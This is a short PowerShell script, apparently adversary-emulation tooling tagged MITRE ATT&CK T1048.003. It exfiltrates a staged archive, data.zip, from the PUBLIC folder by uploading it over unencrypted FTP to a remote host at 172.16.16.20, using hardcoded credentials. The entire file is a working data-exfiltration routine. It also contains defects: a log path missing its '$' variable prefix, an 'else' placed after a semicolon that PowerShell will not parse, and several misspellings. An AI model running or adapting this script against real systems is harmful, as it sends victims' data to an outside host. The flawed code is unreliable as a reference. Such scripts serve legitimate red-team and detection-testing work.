# Exfiltrate archive using ftp
# Technic ID : T1048.003
Clear-Host
Write-Output "==============================================================================="
Write-Output "Exfiltratrion over Alternative Protocol: "
Write-Output "Exfiltration over unencrytpted Non-C2 protocol (T1048.003)"
Write-Output "==============================================================================="
#
$LogFile = "env:PUBLIC\exf\ftp_exfiltration.log";
$Username = "ftp_user";
$Password = "ftp_password";
$Ftp = "ftp://172.16.16.20"; 
$FtpPort = "21"; 
$ArchiveName = "data.zip";
$LocalStorageDir = "$env:PUBLIC\exf";
$Slash = "/"; 
$AntiSlash = "\"; 
$Column = ":";
$FtpUri = "$Ftp$Column$FtpPort";
$FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
Get-Date | Out-File -FilePath "$LogFile";
if ([System.IO.File]::Exists("$FullPathArchive")) 
{
    $ftp = [System.Net.FtpWebRequest]::Create("$FtpUri$Slash$ArchiveName");
    $ftp = [System.Net.FTPWebRequest]$ftp;
    $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
    $ftp.Credentials = New-Object System.Net.NetworkCredential("$Username", "$Password");
    $ftp.UseBinary = $true;
    $ftp.UsePassive = $true;
    $content = [System.IO.File]::ReadAllBytes("$FullPathArchive");
    $ftp.ContentLength = $content.Length;
    $requestStream = $ftp.GetRequestStream();
    $requestStream.Write($content, 0, $content.Length);
    $Result = "The file " + "$FullPathArchive" + " has been succefully uploaded to " + "$FtpUri";
    Write-Output "$Result" | Out-File -FilePath "$LogFile" -Append;
    $requestStream.Close();
    $requestStream.Dispose();
    exit 0;
};
else 
{ 
    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Append;
    exit 1;
};